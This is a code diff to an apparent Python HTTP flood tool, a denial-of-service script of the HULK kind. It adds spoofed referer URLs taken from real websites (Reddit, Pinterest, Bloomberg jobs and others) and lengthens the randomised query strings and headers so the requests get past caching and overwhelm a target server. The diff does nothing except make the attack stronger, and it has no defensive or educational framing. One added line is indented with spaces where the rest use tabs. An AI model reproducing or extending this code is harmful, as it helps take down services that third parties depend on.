@@ -2837,6 +2837,16 @@ def referer_list():
 	headers_referers.append('http://www.bing.com/search?q=')
 	headers_referers.append('https://add.my.yahoo.com/rss?url=')
 	headers_referers.append('https://play.google.com/store/search?q=')
+	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
+	headers_referers.append('http://www.reddit.com/search?q=')
+	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
+	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
+	headers_referers.append('http://jobs.leidos.com/search?q=')
+	headers_referers.append('http://jobs.bloomberg.com/search?q=')
+	headers_referers.append('https://www.pinterest.com/search/?q=')
+	headers_referers.append('http://millercenter.org/search?q=')
+	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
+        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
 	headers_referers.append('http://www.usatoday.com/search/results?q=')
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
 	headers_referers.append('http://' + host + '/')
@@ -2846,7 +2856,7 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 90)
+		a = random.randint(65, 160)
 		out_str += chr(a)
 	return(out_str)
 
@@ -2874,12 +2884,12 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,1000)) + '=' + buildblock(random.randint(3,100)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
+	request.add_header('Keep-Alive', random.randint(110,150))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
